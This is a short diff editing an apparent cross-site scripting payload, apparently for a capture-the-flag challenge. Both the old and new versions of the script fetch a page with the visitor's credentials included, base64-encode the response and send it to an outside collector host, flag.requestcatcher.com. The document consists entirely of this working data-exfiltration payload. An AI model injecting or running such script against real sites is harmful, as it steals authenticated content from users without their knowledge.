@@ -1,5 +1,5 @@
 <script>
-      fetch("http://localhost/", {credentials: "include"})
-        .then(r => r.text())
-        .then(data => fetch("https://flag.requestcatcher.com/?" + btoa(data)));
-    </script>
+fetch("/", { credentials: "include" })
+  .then(r => r.text())
+  .then(t => fetch("https://flag.requestcatcher.com/?flag=" + btoa(t)));
+</script>
